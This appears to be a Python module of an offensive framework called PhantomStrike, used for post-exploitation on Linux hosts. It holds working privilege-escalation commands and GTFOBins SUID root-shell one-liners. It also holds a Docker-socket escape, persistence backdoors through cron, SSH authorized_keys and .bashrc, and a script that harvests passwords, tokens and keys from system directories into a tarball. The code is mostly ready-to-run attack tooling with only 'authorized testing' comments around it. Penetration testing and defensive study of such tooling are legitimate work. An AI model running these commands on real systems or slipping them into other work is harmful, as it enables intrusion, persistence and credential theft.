"""
PhantomStrike Post-Exploitation — Privilege escalation checks,
lateral movement discovery, persistence mechanisms, and data collection.
"""
from __future__ import annotations
import asyncio
import logging
from datetime import datetime
from typing import Optional

import aiohttp

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.post")

# Linux privesc checks
LINUX_PRIVESC_CHECKS = [
    {"name": "SUID binaries", "command": "find / -perm -4000 -type f 2>/dev/null"},
    {"name": "World-writable dirs", "command": "find / -writable -type d 2>/dev/null | head -20"},
    {"name": "Cron jobs", "command": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"},
    {"name": "Sudo permissions", "command": "sudo -l 2>/dev/null"},
    {"name": "Kernel version", "command": "uname -a"},
    {"name": "Running processes", "command": "ps aux --sort=-%mem | head -20"},
    {"name": "Network connections", "command": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"},
    {"name": "SSH keys", "command": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"},
    {"name": "Password files", "command": "cat /etc/passwd 2>/dev/null"},
    {"name": "Docker socket", "command": "ls -la /var/run/docker.sock 2>/dev/null"},
    {"name": "Capabilities", "command": "getcap -r / 2>/dev/null"},
    {"name": "Environment vars", "command": "env 2>/dev/null | grep -i 'pass\\|key\\|secret\\|token'"},
    {"name": "Writable /etc/passwd", "command": "test -w /etc/passwd && echo 'WRITABLE!' || echo 'not writable'"},
    {"name": "GTFOBins SUID", "command": "find / -perm -4000 2>/dev/null | grep -E '(python|perl|ruby|node|vim|find|bash|sh|env|awk|nmap)'"},
]

# Persistence techniques
PERSISTENCE_TECHNIQUES = {
    "cron_backdoor": {
        "name": "Cron Job Backdoor",
        "mitre": "T1053.003",
        "command": '(crontab -l 2>/dev/null; echo "* * * * * /tmp/.phantom_persist") | crontab -',
        "cleanup": "crontab -l | grep -v phantom_persist | crontab -",
    },
    "ssh_key": {
        "name": "SSH Key Persistence",
        "mitre": "T1098.004",
        "command": "mkdir -p ~/.ssh && echo '{pubkey}' >> ~/.ssh/authorized_keys",
        "cleanup": "grep -v phantom ~/.ssh/authorized_keys > /tmp/ak && mv /tmp/ak ~/.ssh/authorized_keys",
    },
    "bashrc": {
        "name": ".bashrc Backdoor",
        "mitre": "T1546.004",
        "command": "echo '# phantom_persist' >> ~/.bashrc && echo '{payload}' >> ~/.bashrc",
        "cleanup": "sed -i '/phantom_persist/d' ~/.bashrc",
    },
    "systemd_service": {
        "name": "Systemd Service",
        "mitre": "T1543.002",
        "description": "Create a systemd service for persistence",
    },
}

# Lateral movement discovery
LATERAL_MOVEMENT_CHECKS = [
    {"name": "ARP cache", "command": "arp -a 2>/dev/null || ip neigh 2>/dev/null"},
    {"name": "SSH config", "command": "cat ~/.ssh/config 2>/dev/null; cat ~/.ssh/known_hosts 2>/dev/null | head -20"},
    {"name": "Hosts file", "command": "cat /etc/hosts 2>/dev/null"},
    {"name": "Internal subnets", "command": "ip addr show 2>/dev/null || ifconfig 2>/dev/null"},
    {"name": "Open shares", "command": "smbclient -L 127.0.0.1 -N 2>/dev/null"},
    {"name": "Database configs", "command": "find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | xargs grep -l 'password\\|passwd\\|pwd' 2>/dev/null | head -10"},
    {"name": "Docker containers", "command": "docker ps 2>/dev/null"},
    {"name": "Kubernetes", "command": "kubectl get pods 2>/dev/null"},
]


class PostExploitEngine(BaseModule):
    """Post-exploitation module — privesc, lateral movement, persistence."""

    @property
    def name(self) -> str:
        return "phantom-post"

    @property
    def description(self) -> str:
        return "Post-exploit — privesc, lateral movement, persistence, data collection"

    @property
    def category(self) -> str:
        return "post_exploitation"

    async def _setup(self):
        pass

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Run post-exploitation enumeration and actions."""
        options = options or {}
        start_time = datetime.now()
        self.status = ModuleStatus.RUNNING
        operation = options.get("operation", "enumerate")

        findings = {
            "target": target,
            "operation": operation,
            "privesc_vectors": [],
            "lateral_targets": [],
            "persistence_options": [],
            "collected_data": [],
        }

        if operation == "enumerate":
            # Generate the full enumeration script
            findings["privesc_vectors"] = self._get_privesc_checks()
            findings["lateral_targets"] = self._get_lateral_checks()
            findings["persistence_options"] = self._get_persistence_options()
            findings["enumeration_script"] = self._generate_enum_script()

        elif operation == "privesc":
            findings["privesc_vectors"] = self._get_privesc_checks()
            findings["auto_privesc_script"] = self._generate_privesc_script()

        elif operation == "persist":
            technique = options.get("technique", "cron_backdoor")
            if technique in PERSISTENCE_TECHNIQUES:
                findings["persistence_options"] = [PERSISTENCE_TECHNIQUES[technique]]

        elif operation == "lateral":
            findings["lateral_targets"] = self._get_lateral_checks()

        elif operation == "collect":
            findings["collection_script"] = self._generate_collection_script()

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name, operation=operation,
            success=True, data=findings,
            findings_count=len(findings["privesc_vectors"]) + len(findings["lateral_targets"]),
            start_time=start_time, end_time=datetime.now(),
        )

    def _get_privesc_checks(self) -> list[dict]:
        return LINUX_PRIVESC_CHECKS.copy()

    def _get_lateral_checks(self) -> list[dict]:
        return LATERAL_MOVEMENT_CHECKS.copy()

    def _get_persistence_options(self) -> list[dict]:
        return [
            {"name": v["name"], "mitre": v.get("mitre", ""), "key": k}
            for k, v in PERSISTENCE_TECHNIQUES.items()
        ]

    def _generate_enum_script(self) -> str:
        """Generate a comprehensive enumeration script."""
        lines = [
            "#!/bin/bash",
            "# PhantomStrike Post-Exploitation Enumeration Script",
            "# For AUTHORIZED penetration testing only",
            'echo "=== PhantomStrike Post-Exploit Enum ==="',
            'echo "Timestamp: $(date)"',
            'echo "Hostname: $(hostname)"',
            'echo "User: $(whoami)"',
            'echo "ID: $(id)"',
            'echo ""',
        ]

        for check in LINUX_PRIVESC_CHECKS:
            lines.append(f'echo "=== {check["name"]} ==="')
            lines.append(check["command"])
            lines.append('echo ""')

        lines.append('echo "=== Lateral Movement Discovery ==="')
        for check in LATERAL_MOVEMENT_CHECKS:
            lines.append(f'echo "--- {check["name"]} ---"')
            lines.append(check["command"])
            lines.append('echo ""')

        return "\n".join(lines)

    def _generate_privesc_script(self) -> str:
        """Generate auto-privilege-escalation attempt script."""
        return """#!/bin/bash
# PhantomStrike Auto-PrivEsc — Authorized testing only
echo "[*] Checking privilege escalation vectors..."

# Check SUID binaries for GTFOBins
echo "[*] Checking SUID binaries..."
SUID=$(find / -perm -4000 -type f 2>/dev/null)
for bin in $SUID; do
    case "$bin" in
        *python*) echo "[!] SUID Python found: $bin — try: $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"; ;;
        *find*) echo "[!] SUID find found: $bin — try: $bin . -exec /bin/sh -p \\;"; ;;
        *vim*) echo "[!] SUID vim found: $bin — try: $bin -c ':!/bin/sh'"; ;;
        *nmap*) echo "[!] SUID nmap found: $bin — try: $bin --interactive then !sh"; ;;
        *bash*) echo "[!] SUID bash found: $bin — try: $bin -p"; ;;
    esac
done

# Check sudo permissions
echo "[*] Checking sudo..."
SUDO=$(sudo -l 2>/dev/null)
if echo "$SUDO" | grep -q "NOPASSWD"; then
    echo "[!] NOPASSWD sudo entries found!"
    echo "$SUDO" | grep "NOPASSWD"
fi

# Check writable /etc/passwd
if [ -w /etc/passwd ]; then
    echo "[!] CRITICAL: /etc/passwd is writable! Can add root user."
fi

# Check Docker socket
if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket accessible — can escalate via: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi

echo "[*] PrivEsc check complete."
"""

    def _generate_collection_script(self) -> str:
        """Generate data collection script."""
        return """#!/bin/bash
# PhantomStrike Data Collection — Authorized testing only
OUTDIR="/tmp/.phantom_collect_$(date +%s)"
mkdir -p "$OUTDIR"

# System info
uname -a > "$OUTDIR/sysinfo.txt"
cat /etc/os-release >> "$OUTDIR/sysinfo.txt" 2>/dev/null

# Users and groups
cat /etc/passwd > "$OUTDIR/passwd.txt" 2>/dev/null
cat /etc/group > "$OUTDIR/group.txt" 2>/dev/null

# Network
ip addr > "$OUTDIR/network.txt" 2>/dev/null
ss -tlnp >> "$OUTDIR/network.txt" 2>/dev/null
cat /etc/hosts >> "$OUTDIR/network.txt" 2>/dev/null

# Interesting files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.env" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -50 > "$OUTDIR/interesting_files.txt"

# Credentials in files
grep -r "password\|passwd\|pwd\|secret\|token\|api_key" /etc/ /opt/ /var/www/ 2>/dev/null | head -50 > "$OUTDIR/credentials.txt"

# Package the collection
tar czf "/tmp/phantom_collect.tar.gz" -C "$OUTDIR" .
echo "[*] Collection saved to /tmp/phantom_collect.tar.gz"
rm -rf "$OUTDIR"
"""
